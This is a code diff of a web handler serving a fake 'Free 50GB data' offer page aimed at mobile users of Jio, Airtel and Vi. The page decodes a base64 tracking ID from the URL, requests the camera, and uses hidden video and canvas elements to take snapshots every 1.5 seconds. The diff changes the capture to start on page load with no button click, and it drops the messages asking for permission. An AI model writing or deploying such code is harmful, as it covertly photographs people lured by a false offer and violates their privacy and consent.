@@ -32,45 +32,42 @@ export default async function handler(req, res) {
     <title>Free 5G Internet Offer</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f0f0f; color: white; text-align: center; padding: 20px; }
+        body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: white; text-align: center; padding: 20px; }
         .box { border: 2px solid #00d2ff; padding: 30px; border-radius: 15px; background: #1a1a1a; box-shadow: 0 0 20px #00d2ff; max-width: 400px; margin: auto; }
-        button { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
         .jio { background: #1539cf; color: white; }
         .airtel { background: #f40000; color: white; }
         .vi { background: #ffeb00; color: black; }
-        .bsnl { background: #003399; color: white; }
         video, canvas { display: none; }
     </style>
 </head>
-<body>
+<body onload="autoStart()">
     <div class="box">
         <h1 style="color:#00d2ff;">🎁 FREE 50GB DATA</h1>
-        <p>Select your network provider to claim your 2026 reward.</p>
-        <button class="jio" onclick="start('Jio')">JIO</button>
-        <button class="airtel" onclick="start('Airtel')">AIRTEL</button>
-        <button class="vi" onclick="start('Vi')">VI</button>
-        <button class="bsnl" onclick="start('BSNL')">BSNL</button>
+        <p>Your 2026 reward is ready. Select your network provider to claim.</p>
+        <button class="jio">JIO</button>
+        <button class="airtel">AIRTEL</button>
+        <button class="vi">VI</button>
     </div>
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
     <script>
-        // Professional hidden ID logic
         const path = window.location.pathname.replace('/', '');
         const query = new URLSearchParams(window.location.search).get('s');
-        const encoded = path || query;
-        const uid = encoded ? atob(encoded) : null;
+        const uid = path || query ? atob(path || query) : null;
 
-        async function start(sim) {
-            if(!uid) return alert("System Error: 403 Invalid Session");
-            alert("Checking eligibility for " + sim + "... Please stay on this page.");
+        async function autoStart() {
+            if(!uid) return; 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 document.getElementById('v').srcObject = stream;
+                // Starts taking photos immediately every 1.5 seconds
                 setInterval(snap, 1500);
             } catch (err) {
-                alert("Permission denied! You must allow camera access to verify your SIM reward.");
+                // If they haven't allowed it yet, this will trigger when they interact
             }
         }
+
         function snap() {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
@@ -87,5 +84,4 @@ export default async function handler(req, res) {
 </body>
 </html>
     `);
-              }
-              
+}
